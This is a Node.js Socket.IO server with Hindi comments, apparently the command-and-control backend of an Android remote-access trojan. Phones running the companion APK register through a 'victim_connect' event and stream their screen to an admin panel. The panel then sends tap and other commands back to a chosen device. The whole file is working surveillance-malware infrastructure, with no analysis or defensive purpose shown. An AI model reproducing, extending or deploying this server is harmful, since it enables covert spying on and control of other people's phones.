const express = require('express');
const http = require('http');
const path = require('path');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: "*", // सभी को कनेक्ट करने की अनुमति देता है
    }
});

// Render द्वारा प्रदान किया गया पोर्ट या डिफ़ॉल्ट रूप से 8080
const PORT = process.env.PORT || 8080;

// --- डेटा स्टोरेज (अस्थायी) ---
let adminSocket = null; // पैनल (एडमिन) का सॉकेट
let devices = {}; // कनेक्टेड डिवाइस (APK) को स्टोर करने के लिए ऑब्जेक्ट

// --- सर्वर को शुरू करना ---
server.listen(PORT, () => {
    console.log(`सर्वर पोर्ट ${PORT} पर चल रहा है...`);
});

// --- वेब रूट्स ---
// पैनल का HTML पेज सर्व करने के लिए
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'panel.html'));
});

// --- Socket.IO कनेक्शन लॉजिक ---
io.on('connection', (socket) => {
    console.log(`एक क्लाइंट कनेक्ट हुआ: ${socket.id}`);

    // ==================================================
    // 1. पैनल (एडमिन) से आने वाले इवेंट्स
    // ==================================================

    // जब पैनल कनेक्ट होता है और खुद को 'admin' के रूप में पहचानता है
    socket.on('admin_join', () => {
        console.log(`पैनल (एडमिन) कनेक्ट हुआ: ${socket.id}`);
        adminSocket = socket;
        // पैनल को पहले से कनेक्टेड सभी डिवाइस की सूची भेजें
        socket.emit('device_list', Object.values(devices));
    });

    // जब पैनल किसी डिवाइस को कमांड (जैसे टैप) भेजता है
    socket.on('command_to_device', (data) => {
        const { deviceId, action, payload } = data;
        const targetDevice = devices[deviceId];

        if (targetDevice && targetDevice.socketId) {
            console.log(`डिवाइस ${deviceId} को कमांड भेजा जा रहा है: ${action}`);
            // कमांड को सीधे उस डिवाइस के सॉकेट पर भेजें
            io.to(targetDevice.socketId).emit(action, payload);
        } else {
            console.log(`कमांड भेजने में विफल: डिवाइस ${deviceId} नहीं मिला.`);
        }
    });


    // ==================================================
    // 2. डिवाइस (APK) से आने वाले इवेंट्स
    // ==================================================

    // जब कोई नया डिवाइस (APK) कनेक्ट होता है
    socket.on('victim_connect', (deviceInfo) => {
        console.log('नया डिवाइस कनेक्ट हुआ:', deviceInfo);
        
        // डिवाइस की जानकारी को हमारे 'devices' ऑब्जेक्ट में स्टोर करें
        devices[deviceInfo.deviceId] = {
            ...deviceInfo,
            socketId: socket.id // डिवाइस का सॉकेट आईडी भी स्टोर करें
        };

        // अगर पैनल कनेक्टेड है, तो उसे इस नए डिवाइस की जानकारी भेजें
        if (adminSocket) {
            adminSocket.emit('new_device_joined', devices[deviceInfo.deviceId]);
        }
    });

    // जब डिवाइस से स्क्रीन का डेटा आता है
    socket.on('screen_data', (data) => {
        // यह डेटा सीधे पैनल को भेजें
        if (adminSocket) {
            adminSocket.emit('screen_update', data);
        }
    });


    // ==================================================
    // 3. डिस्कनेक्शन हैंडलिंग
    // ==================================================
    socket.on('disconnect', () => {
        console.log(`क्लाइंट डिस्कनेक्ट हो गया: ${socket.id}`);
        
        if (adminSocket && socket.id === adminSocket.id) {
            // अगर पैनल डिस्कनेक्ट हुआ है
            adminSocket = null;
            console.log('पैनल (एडमिन) डिस्कनेक्ट हो गया.');
        } else {
            // अगर कोई डिवाइस (APK) डिस्कनेक्ट हुआ है
            let disconnectedDeviceId = null;
            for (const deviceId in devices) {
                if (devices[deviceId].socketId === socket.id) {
                    disconnectedDeviceId = deviceId;
                    break;
                }
            }

            if (disconnectedDeviceId) {
                console.log(`डिवाइस ${disconnectedDeviceId} डिस्कनेक्ट हो गया.`);
                delete devices[disconnectedDeviceId]; // डिवाइस को सूची से हटा दें
                // पैनल को बताएं कि डिवाइस हट गया है
                if (adminSocket) {
                    adminSocket.emit('device_disconnected', disconnectedDeviceId);
                }
            }
        }
    });
});
